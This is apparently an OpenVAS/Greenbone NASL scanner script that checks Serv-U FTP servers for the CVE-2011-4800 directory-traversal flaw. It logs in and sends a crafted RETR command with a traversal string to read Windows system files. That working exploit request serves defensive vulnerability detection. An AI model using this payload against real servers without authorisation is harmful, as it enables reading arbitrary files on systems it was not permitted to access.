# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:serv-u:serv-u";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103354");
  script_version("2023-12-20T05:05:58+0000");
  script_cve_id("CVE-2011-4800");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

  script_name("Serv-U FTP Server Jail Break");

  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-12-02 11:28:44 +0100 (Fri, 02 Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("FTP");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_solarwinds_serv-u_consolidation.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("solarwinds/servu/detected", "Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47021");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50875");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71583");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18182");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2011-11/0454.html");

  script_tag(name:"summary", value:"Serv-U FTP is prone to a directory-traversal vulnerability because the
  application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue allows an attacker to read arbitrary files from locations
  outside of the application's current directory. This could help the attacker
  launch further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files("windows");

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

foreach file(keys(files)){

  soc1 = open_sock_tcp(port);
  if(!soc1){
    exit(0);
  }

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(!login_details){
    ftp_close(socket:soc1);
    exit(0);
  }

  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(!ftpPort2){
    ftp_close(socket:soc1);
    exit(0);
  }

  soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
  if(!soc2){
    ftp_close(socket:soc1);
    exit(0);
  }

  req = "RETR ..:\\:..\\..:\\..:\\..:\\..:\\..:\\..:\\..:\\" + files[file];
  send(socket:soc1, data:string(req, "\r\n"));
  res = ftp_recv_data(socket:soc2);
  close(soc2);

  if(res && egrep(pattern:file, string:res)){
    security_message(port:port, data:"Sending the command " + req + " allowed to receive the following content: " + res);
    exit(0);
  }
}

exit(99);
